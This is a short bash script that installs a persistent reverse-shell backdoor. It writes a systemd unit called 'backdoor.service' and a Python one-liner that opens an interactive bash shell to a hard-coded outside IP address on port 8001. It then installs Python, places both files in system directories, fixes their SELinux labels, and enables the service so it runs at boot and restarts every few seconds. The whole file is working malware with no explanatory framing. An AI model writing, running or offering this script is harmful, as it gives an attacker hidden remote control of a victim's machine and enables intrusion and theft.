#!/bin/bash
cat > backdoor.service << EOF
[Unit]
Description=me achou
After=multi-user.target
Conflicts=getty@tty1.service

[Service]
Type=simple
WorkingDirectory=/opt/mycambot/
ExecStart=/usr/bin/python3 /usr/local/bin/b.py
StandardInput=tty-force
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF

cat > b.py << EOF
import os ; os.system('bash -i >& /dev/tcp/45.171.127.130/8001 0>&1')
EOF

dnf -y install python38
rm /usr/lib/systemd/system/backdoor.service
mv b.py /usr/local/bin/
mv backdoor.service /usr/lib/systemd/system/
restorecon -RFv /usr/lib/systemd/system/backdoor.service
systemctl daemon-reload
systemctl start backdoor.service
systemctl enable backdoor.service

